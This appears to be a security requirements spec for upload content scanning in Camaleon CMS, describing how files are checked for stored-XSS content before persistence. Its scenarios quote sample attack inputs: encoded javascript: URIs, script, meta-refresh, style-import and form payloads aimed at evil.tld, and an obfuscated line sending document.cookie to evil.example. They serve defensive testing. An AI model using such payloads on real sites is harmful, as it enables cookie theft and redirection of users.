## Purpose

Define the security requirements for content scanning of uploaded files. Uploaded files MUST be scanned for executable content patterns before being persisted, to prevent stored XSS attacks via uploaded files.
## Requirements
### Requirement: Content is scanned before being written to a web-served path

The system SHALL scan upload content for malicious patterns before it writes the content into the upload staging directory. Rejected content is then never present, even transiently, at a path that the web server serves.

Scanning rejects and never repairs. Content that trips a rule SHALL be refused with `Potentially malicious content found!` rather than sanitized, escaped or rewritten.

#### Scenario: data: payload is scanned before staging
- **WHEN** a `crop_url` upload supplies a `data:` URI whose decoded payload contains a `<script>` tag
- **THEN** the payload is rejected without any file being created under `public/tmp/{site_id}/`

#### Scenario: Downloaded remote body is scanned before staging
- **WHEN** a remote URL upload returns a body containing an event-handler attribute
- **THEN** the body is rejected without being written into `public/tmp/{site_id}/`

#### Scenario: Hostile payload is never retrievable from the staging path
- **WHEN** a media-permission user posts a `crop_url` upload named `x.html` whose `data:` payload contains `<script>`
- **THEN** no file is ever created at `public/tmp/{site_id}/x.html`, so a concurrent request for `/tmp/{site_id}/x.html` cannot retrieve the payload at any point

### Requirement: Upload scanning is decided by authorization

The system SHALL scan an upload unless the uploading user holds the `media_unfiltered_upload` permission. The location of the source file SHALL NOT decide whether the scan runs.

#### Scenario: Every source is scanned for a user without the permission
- **WHEN** a user without `media_unfiltered_upload` uploads from a `data:` payload, a remote download, a private-media file, or a file already published under `Rails.public_path`
- **THEN** the content scan runs, whatever the source

#### Scenario: An already-published file can be re-cropped
- **WHEN** a user without `media_unfiltered_upload` uses a file already stored under `Rails.public_path` as the source of a crop
- **THEN** the crop proceeds, with the content scan running against the source and the output filename selecting the ruleset
- **AND** the former exemption for sources under the public root no longer applies

#### Scenario: Re-crop under a different extension cannot bypass the ruleset
- **WHEN** a user without `media_unfiltered_upload` uploads an SVG that the markup ruleset accepts, then re-crops it supplying an output name ending in `.html`
- **THEN** the re-crop is scanned under the markup ruleset selected by the output name and rejected if it carries anything that ruleset refuses, so the bytes are never served as live `text/html`
- **AND** the scan ruleset and the served `Content-Type` follow the caller-supplied output filename, not the source path
- **AND** a scan keyed on the source path would let a rewritten extension bypass it

#### Scenario: A private-media source is still scanned
- **WHEN** a file outside the public root (for example under the private-media directory) is used as an upload source
- **THEN** the content scan runs as before

#### Scenario: A permitted user uploads without scanning
- **WHEN** a user holding `media_unfiltered_upload` uploads a file whose content matches a blocked pattern
- **THEN** the upload is accepted, because the permission exempts the uploader from scanning

#### Scenario: Scanning is skipped without reading the file for a permitted user
- **WHEN** the permission check answers true
- **THEN** the content scan is not performed, so the file is not read in order to scan it

### Requirement: Content scanning is available for in-memory content

The system SHALL expose a content-scanning entry point that accepts content and a filename directly, in addition to the existing IO-based entry point, so callers holding decoded bytes can scan without first writing them to disk. Both entry points SHALL apply the same detection logic — parse-based checking for SVG, normalized pattern matching otherwise.

#### Scenario: String scan matches IO scan for the same bytes
- **WHEN** the same content is scanned once as an in-memory String and once through a file handle
- **THEN** both scans return the same verdict

#### Scenario: SVG content passed as a String uses the parse-based checker
- **WHEN** SVG content containing an event handler is scanned as an in-memory String with an `.svg` filename
- **THEN** the scan reports the content as unsafe

#### Scenario: IO entry point still rewinds
- **WHEN** content is scanned through the IO-based entry point and the scan passes
- **THEN** the IO pointer is at the beginning and the full content can be read again

### Requirement: Content is normalized before pattern matching

The system SHALL normalize file content before it matches the content against the malicious-content patterns, so that encoded variants of a blocked pattern are detected. Normalization SHALL decode HTML entities repeatedly, up to a bounded number of passes, and SHALL remove NUL and control characters.

#### Scenario: Hex-entity encoded javascript scheme is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="jav&#x61;script:alert(1)">`
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Decimal-entity encoded javascript scheme is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="&#106;avascript:alert(1)">`
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: NUL byte inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a NUL byte inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Double-encoded entity is rejected
- **WHEN** a user uploads a non-SVG file whose content decodes to a blocked pattern only after more than one entity-decoding pass
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Entity decoding is bounded
- **WHEN** content is normalized
- **THEN** decoding stops after at most 5 passes, matching the bound used by `UserUrlValidator#validate_path_traversal`, rather than looping until stable

#### Scenario: Escaped code examples are rejected as a fail-closed consequence
- **WHEN** a user uploads a non-SVG file containing HTML-escaped markup such as `<p>Use &lt;script&gt; carefully</p>`
- **THEN** the system returns `'Potentially malicious content found!'`, because normalization decodes the entities before matching

#### Scenario: Plain non-markup content is unaffected
- **WHEN** a user uploads a plain text, CSV, or JSON file containing no blocked pattern
- **THEN** the upload is accepted

### Requirement: URI scheme names tolerate only the characters that browsers strip

Normalization SHALL tolerate exactly the characters that browsers strip when they parse a URL, inside a URI scheme name: TAB, LF and CR. Other whitespace, notably the space character, SHALL NOT be tolerated inside a scheme.

#### Scenario: Tab inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a TAB character inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Newline inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a LF character inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Prose containing a scheme word before a spaced colon is accepted
- **WHEN** a user uploads a text file containing `Sample data : 42`
- **THEN** the upload is accepted, because a space is not a character browsers strip from a URI scheme
- **AND** ordinary prose in which a blocked scheme word is followed by a space and a colon is not reported as malicious

### Requirement: Reject uploaded files with event handler attributes

The system SHALL reject file uploads whose content contains executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

#### Scenario: Non-SVG file with onclick is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onclick` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Non-SVG file with onload is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Rejected file is absent from the staging directory
- **WHEN** an upload is rejected for containing an event-handler attribute
- **THEN** no file for that upload remains under `public/tmp/{site_id}/`

### Requirement: Markup uploads are checked for event handlers by parse

The system SHALL scan every markup upload for event handlers with the parse-based checker of the `svg-upload-sanitization` capability. This applies to every extension a browser parses as markup, not only `.svg`. The checker SHALL reject any attribute whose name begins with `on`, by shape and not by a list of handler names.

#### Scenario: A markup file with an unlisted handler is rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onpointerdown`, `ontouchstart`, `onauxclick` or `onemptied` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: A markup file with a listed handler is still rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onclick` or `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: SVG with event handlers is rejected (not scanned by regex)
- **WHEN** a user uploads an SVG file containing event handler attributes
- **THEN** the system rejects the upload via the parse-based checker (see `svg-upload-sanitization`)

### Requirement: The regex denylist stays as a control for non-markup uploads

The regex denylist SHALL NOT be the only control for markup, and Camaleon SHALL NOT remove it. It continues to apply to non-markup uploads as defense-in-depth, where its incompleteness cannot produce a stored-XSS path.

#### Scenario: A non-markup upload keeps the denylist
- **WHEN** a user uploads a non-markup file whose content includes an `onclick` attribute
- **THEN** the regex denylist rejects the upload as defense-in-depth

#### Scenario: A byte-level backstop covers what the parse misses
- **WHEN** the parse of a markup upload misses a handler or a blocked element because it autodetected an encoding that a browser resolves differently
- **THEN** a byte-level backstop over the same bytes catches it (see "Markup is scanned at the byte level as well as the parse level")

### Requirement: Reject uploaded files with `<script>` tags

The system SHALL reject file uploads whose content contains `<script>` elements. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: SVG `<script>` elements are handled by the XML parse-based checker; non-SVG files continue to use the regex denylist, now applied to normalized content and tolerant of `/` as a tag delimiter.

#### Scenario: Non-SVG with `<script>` is rejected
- **WHEN** a user uploads a non-SVG file containing a `<script>` tag
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Rejected `<script>` payload is never written to the staging path
- **WHEN** a media-permission user posts a `crop_url` upload named `x.html` whose `data:` payload contains `<script>`
- **THEN** the system returns `'Potentially malicious content found!'`
- **AND** no file is created at `public/tmp/{site_id}/x.html` at any point during the request

### Requirement: Reject uploaded files with `javascript:` URIs

The system SHALL reject file uploads whose content contains `javascript:` URIs in attributes, including entity-encoded and whitespace-interrupted forms of the scheme. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: SVG `javascript:` URIs are handled by the XML parse-based checker; non-SVG files continue to use the regex denylist, now applied to normalized content.

#### Scenario: Non-SVG with javascript: in href is rejected
- **WHEN** a user uploads a non-SVG file containing `javascript:` in an href or src attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Reject uploaded files containing `vbscript:` URIs

The system SHALL reject file uploads whose content contains `vbscript:` URIs, matching the schemes already blocked by the SVG parse-based checker.

#### Scenario: Non-SVG with vbscript: in href is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="vbscript:msgbox(1)">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Blocked element detection tolerates alternative tag delimiters

The system SHALL treat `/` as a tag-name delimiter in addition to whitespace and `>`, so a blocked element cannot evade detection by using a slash immediately after the tag name.

#### Scenario: Slash-delimited script tag is rejected
- **WHEN** a user uploads a non-SVG file containing `<script/src="//evil.tld"></script>`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Reject additional dangerous elements

The system SHALL reject file uploads whose content contains elements able to navigate, exfiltrate, or load remote active content, in addition to the elements already blocked: `meta`, `style`, `form`, `applet`, `frame`, `frameset`, `link`, `template`, `portal`, `marquee`, and `math`.

#### Scenario: Meta refresh redirect is rejected
- **WHEN** a user uploads a non-SVG file containing `<meta http-equiv="refresh" content="0;url=//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Style element with remote import is rejected
- **WHEN** a user uploads a non-SVG file containing `<style>@import "//evil.tld/x.css";</style>`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Form with remote action is rejected
- **WHEN** a user uploads a non-SVG file containing `<form action="//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Applet element is rejected
- **WHEN** a user uploads a non-SVG file containing `<applet code="Evil.class">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Frameset and frame elements are rejected
- **WHEN** a user uploads a non-SVG file containing `<frameset><frame src="//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Safe file scanning does not consume the IO stream

After scanning for malicious content, the file pointer SHALL be rewound so subsequent consumers can read the full content.

*(Unchanged — applies to all file types)*

#### Scenario: Tempfile is readable after scan
- **WHEN** the system scans a Tempfile for unsafe content and the scan passes
- **THEN** the Tempfile pointer is at the beginning and the full content can be read again

### Requirement: Content substituted by a before_upload handler is re-scanned

The `before_upload` hook runs after the initial content scan and can replace the IO that the pipeline persists (`settings[:uploaded_io]`). When the uploading user does not hold `media_unfiltered_upload`, the pipeline SHALL detect a replacement by object identity across the hook. It SHALL re-scan the substituted content before it writes the content. This implements the `security-capability-gating` requirement on content substituted after the check, for the upload path.

#### Scenario: Handler-substituted bytes are re-scanned for an untrusted uploader

- **WHEN** a user without `media_unfiltered_upload` uploads a clean file and a `before_upload`
  handler replaces `settings[:uploaded_io]` with content containing a `<script>` tag
- **THEN** the substituted content is re-scanned and the upload is refused, with no file written
- **AND** a handler, for example an image optimizer that rewrites an SVG, can substitute bytes that the scanner never saw

### Requirement: Refused substituted content is not written

The pipeline SHALL refuse substituted content that trips a rule with `Potentially malicious content found!`. The pipeline SHALL write no file for it.

#### Scenario: A refused substitution writes no file
- **WHEN** a re-scan of the content that a `before_upload` handler substituted finds a blocked pattern
- **THEN** the upload is refused with `Potentially malicious content found!` and no file is written

### Requirement: The substitution re-scan has two exemptions

A user who holds `media_unfiltered_upload` SHALL be exempt from the re-scan exactly as from the initial scan. When no handler replaces the IO, the pipeline SHALL NOT scan a second time, because the initial scan already covered those bytes.

#### Scenario: A permitted user's handler substitution is not re-scanned

- **WHEN** a user holding `media_unfiltered_upload` uploads a file and a `before_upload` handler
  replaces the IO
- **THEN** the substituted content is persisted without a re-scan, as the permission exempts it

#### Scenario: An unchanged IO is not re-scanned

- **WHEN** a user without `media_unfiltered_upload` uploads a file and no `before_upload` handler
  replaces `settings[:uploaded_io]`
- **THEN** the pipeline does not scan the content a second time after the hook

### Requirement: Scan ruleset is selected by how the stored file will be rendered

The content scanner SHALL choose its ruleset from how a browser parses the stored file, not from a literal `.svg` comparison. An upload whose filename extension a browser parses as markup SHALL be routed to the parse-based markup checker (`svg-upload-sanitization`). Every other upload SHALL be scanned by the generic pattern ruleset.

#### Scenario: The same payload is refused under every markup extension
- **WHEN** content carrying an `onpointerdown` attribute is scanned as `x.svg`, `x.svgz`, `x.html`, `x.htm`, `x.xhtml` and `x.xml`
- **THEN** every one of them is reported unsafe

#### Scenario: A markup-only vector is rejected regardless of extension case
- **WHEN** markup carrying a `foreignObject` element is scanned as `image.svg` and as `image.SVG`
- **THEN** both are rejected as unsafe

### Requirement: Markup extensions are matched case-insensitively and fail closed

The markup extensions SHALL be `svg`, `svgz`, `svg.gz`, `html`, `htm`, `xhtml`, `xht`, `shtml`, `xml`, `xsl` and `xslt`. Matching SHALL be case-insensitive. A filename whose basename is exactly one of these extensions with no stem SHALL be treated as markup, so routing fails closed. Such a dotfile reports no extension.

#### Scenario: An uppercase markup extension is routed to the markup checker
- **WHEN** `content_unsafe?` is called with a filename ending in `.HTML` or `.SVG`
- **THEN** the content is evaluated by the parse-based markup checker, not the generic pattern scan

#### Scenario: A bare markup dotfile name keeps markup routing
- **WHEN** `content_unsafe?` is called with a filename whose basename is exactly `.svg` or `.html`, in any case
- **THEN** the content is evaluated by the parse-based markup checker

### Requirement: Trailing dots and spaces are stripped before routing

The scanner SHALL strip trailing dots and spaces from the filename before it reads the extension. A server or filesystem can strip them and serve `evil.svg.` as `evil.svg`. The routing key must match how the file is served, not the raw name.

#### Scenario: A trailing-dot markup name is routed to the markup checker
- **WHEN** `content_unsafe?` is called with a filename ending in `.svg.` or `.svg ` (a trailing dot or space)
- **THEN** the content is evaluated by the parse-based markup checker, because the trailing character is stripped before the extension is read

### Requirement: The generic ruleset stays as defense-in-depth for non-markup uploads

The generic ruleset SHALL remain in force for non-markup uploads as defense-in-depth. It SHALL NOT be the only control for any content a browser parses as markup.

#### Scenario: A non-markup upload keeps the generic ruleset
- **WHEN** a `.txt` file whose text contains `if a<b and on=1 then x` is scanned
- **THEN** it is not routed to the markup checker and is accepted, because a `.txt` is not served as markup

### Requirement: Compressed markup is decompressed before scanning

The system SHALL decompress gzip-compressed markup uploads and scan the decompressed bytes. Compressed content is opaque to every detection rule, so it would otherwise pass unexamined.

#### Scenario: A hostile compressed SVG is rejected
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG containing an `onpointerdown` attribute
- **THEN** the upload is refused with `Potentially malicious content found!` and no file is persisted

#### Scenario: A clean compressed SVG is accepted
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG with no dangerous elements, attributes or URIs
- **THEN** the upload is stored normally

### Requirement: Every gzip member is decompressed

A gzip stream can hold several concatenated members. A compliant decoder returns the concatenation of all of them. Decoders include the browser that serves the file with `Content-Encoding: gzip`, the gzip CLI and zlib. The system SHALL decompress every member, not only the first, so a hostile payload cannot hide behind a clean decoy member.

#### Scenario: A payload hidden past the first gzip member is refused
- **WHEN** a user uploads a `.svgz` built from two concatenated gzip members, the first a clean SVG fragment and the second carrying an `onpointerdown` attribute
- **THEN** the upload is refused, because every member is decompressed and scanned, not only the first

#### Scenario: A clean multi-member gzip is accepted
- **WHEN** a user uploads a `.svgz` of several gzip members that together decompress to a clean SVG
- **THEN** the upload is accepted, because the members are decompressed and scanned rather than rejected for being multi-member

### Requirement: Decompression is bounded

Decompression SHALL be bounded by a maximum decompressed size, counted across all members. An upload that exceeds the bound SHALL be refused rather than decompressed further, so a compression bomb cannot exhaust memory.

#### Scenario: A compression bomb is refused rather than expanded
- **WHEN** a user uploads a `.svgz` whose payload would decompress beyond the maximum decompressed size
- **THEN** the upload is refused and decompression stops at the bound

### Requirement: Invalid gzip under a compressed extension is scanned as raw markup

An upload with a compressed-markup extension whose bytes are not valid gzip SHALL be scanned as raw markup rather than skipped. A web server can serve those bytes as markup, regardless of a name that suggests compression.

#### Scenario: Uncompressed bytes under a compressed extension are still scanned
- **WHEN** a user uploads a `.svgz` whose bytes are plain, ungzipped SVG containing an `onclick` attribute
- **THEN** the upload is refused, because the bytes are scanned as raw markup

### Requirement: Markup is scanned at the byte level as well as the parse level

The scan SHALL NOT depend on the markup parser choosing the same character encoding as the browser. For every markup upload the system SHALL apply a byte-level check in addition to the parse.

#### Scenario: A spoofed `<meta charset>` cannot hide a handler from the scan
- **WHEN** a user uploads an `.html` file of pure-ASCII bytes declaring `<meta charset="utf-16">` and carrying an `onerror` attribute
- **THEN** the upload is refused, because the byte-level check matches the handler regardless of the encoding the parser autodetected
- **AND** the parser autodetects its encoding from in-band signals: a BOM, an XML declaration, or a `<meta charset>` element
- **AND** WHATWG maps a `utf-16` or `utf-32` `<meta charset>` back to UTF-8, so the browser fires the handler
- **AND** the parser re-decodes the bytes as UTF-16 and sees no handler

### Requirement: The byte-level check strips control bytes and refuses handlers and blocked elements

The byte-level check SHALL strip NUL and C0 control bytes. This collapses UTF-16 and UTF-32 padding and the byte tricks that a URL parser ignores. The check SHALL refuse the upload if the result contains an event-handler attribute or a blocked element.

#### Scenario: Real wide-encoded markup bytes carrying a handler are refused
- **WHEN** a user uploads markup encoded as UTF-16 whose text carries an `onerror` attribute
- **THEN** the upload is refused, because stripping the NUL padding collapses the handler to the bytes a browser would run

### Requirement: The byte-level check does not decode entities

The byte-level check SHALL NOT decode HTML entities. A document that merely displays escaped markup (`&lt;script&gt;`) is then not refused by it. A browser never decodes a character reference in a tag or attribute name, so decoding adds no coverage and brings back that false positive.

#### Scenario: The byte-level check does not entity-decode
- **WHEN** a user uploads a markup file whose only script-like content is escaped (`<p>Use &lt;script&gt; carefully</p>`)
- **THEN** the byte-level check does not refuse it, leaving the parse to accept it as displayed text

### Requirement: Executable script uploads require the unfiltered-upload permission

The system SHALL refuse uploads whose filename extension is an executable script type from any user who does not hold `media_unfiltered_upload`. The script extensions SHALL be `js`, `mjs`, `cjs`, `wasm` and `swf`. Matching SHALL be case-insensitive and SHALL apply the same fail-closed dotfile handling as markup routing.

#### Scenario: An untrusted user cannot upload JavaScript
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is refused and no file is persisted

#### Scenario: Module and WebAssembly extensions are covered
- **WHEN** a user without `media_unfiltered_upload` uploads a `.mjs`, `.cjs` or `.wasm` file
- **THEN** the upload is refused

#### Scenario: A script upload outside a request context is refused
- **WHEN** a `.js` upload is attempted with no current request user or no current site
- **THEN** the upload is refused, matching the fail-closed permission behavior for scanning

### Requirement: The script refusal is an authorization decision

The refusal of a script upload SHALL be an authorization decision, not a scan result. Script content cannot be meaningfully scanned. JavaScript has no safe subset, and every dangerous capability is reachable through dynamic construction, so trivial obfuscation defeats a name-based rule. A scanner that cannot reach a verdict SHALL fail closed.

#### Scenario: Obfuscation does not change the outcome
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file containing `window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])`
- **THEN** the upload is refused, because the refusal is by extension and not by content inspection

### Requirement: Users with the unfiltered-upload permission can upload script

Users holding `media_unfiltered_upload` SHALL be unaffected by the script refusal. That permission already skips scanning entirely, so it already permits these uploads.

#### Scenario: A permitted user may still upload script
- **WHEN** a user holding `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is stored normally

### Requirement: Already-stored uploads can be re-examined against the current rules

The system SHALL provide a report-only task that scans files already stored under the media root and reports those the current rules would refuse. The new rules apply at upload time, so files stored before this change are never otherwise re-examined.

#### Scenario: A stored hostile markup file is reported
- **WHEN** the task runs over a media root containing an `.html` file with an `onpointerdown` attribute
- **THEN** the file is listed in the report with the rule that would refuse it

#### Scenario: A stored script file is reported
- **WHEN** the task runs over a media root containing a `.js` file
- **THEN** the file is listed in the report as a script type that untrusted users may no longer upload

#### Scenario: A clean media root reports nothing
- **WHEN** the task runs over a media root whose files all pass the current rules
- **THEN** the report is empty and the task exits successfully

### Requirement: The re-examination task locates media like uploads do

The task SHALL locate each site's media directory the same way uploads are stored. It SHALL honor the `media_slug_folder` configuration, which places uploads under `media/<slug>` rather than `media/<id>`. A slug-configured install then does not silently scan an empty path and report a false all-clear.

#### Scenario: A slug-configured install is scanned
- **WHEN** the task runs on an install with `media_slug_folder` set
- **THEN** the task scans the `media/<slug>` directory of each site and not an empty `media/<id>` path

### Requirement: The re-examination task includes dotfiles

The task SHALL include stored files whose basename begins with a dot. A basename that is entirely an extension (`.svg`, `.js`) is what upload routing fails closed on. Omitting such names would leave the strictest cases out of the report.

#### Scenario: A stored dotfile is reported
- **WHEN** the task runs over a media root containing a file whose basename is exactly `.js`
- **THEN** the file is listed in the report, because dotfiles are not skipped

### Requirement: The re-examination task scans private media

The task SHALL also scan the private-media directory, not only the public media roots. Private uploads are scanned at save time like public ones, so files stored before these rules apply are equally worth surfacing. Reporting only the public root would overstate the coverage of the task.

#### Scenario: A flagged private-media file is reported
- **WHEN** the task runs with a file stored under the private-media directory that the current rules would refuse
- **THEN** the file is listed in the report, because private media is scanned as well as public

### Requirement: The re-examination task changes no file

The task SHALL NOT delete, move, quarantine or rewrite any file. Its output SHALL identify each finding by site and path. It SHALL state the rule that would refuse the finding, so an operator can decide what to do.

#### Scenario: The task never modifies stored content
- **WHEN** the task completes over a media root containing files it reports
- **THEN** every reported file remains present and byte-identical
